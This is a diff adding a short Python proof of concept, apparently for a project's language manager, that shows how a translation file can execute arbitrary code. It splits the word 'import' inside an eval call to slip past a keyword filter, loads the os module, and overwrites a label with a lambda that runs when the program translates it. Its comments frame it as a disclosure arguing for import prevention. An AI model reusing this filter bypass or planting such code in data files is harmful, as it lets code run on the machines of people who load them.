@@ -1,0 +1,11 @@
+# "ACE" means "Arbitrary Code Execution", and it's exactly what it sounds: VERY bad
+# this is a quick proof of concept on how the languagemanager can be used for evil purposes
+# this is why an "import" prevention is very important
+# you can do anything you can do in one line in a lambda, which is pretty much anything probably. considering you can have other lines for setup it makes it even worse
+
+def func(): print("wot")
+
+os = eval("__imp" + 'ort__("os")')			 # we create a local variable that contains OS
+#this way the "if import in line" won't trigger
+EVIL_FUNCTION = lambda self: self.os.reboot()# we create a lambda that uses it, as we can't create normal functions
+START_BTN = self.EVIL_FUNCTION(self)		 # we call the lambda. we overwrite a label so that it will be called automatically when the program tries to translate it
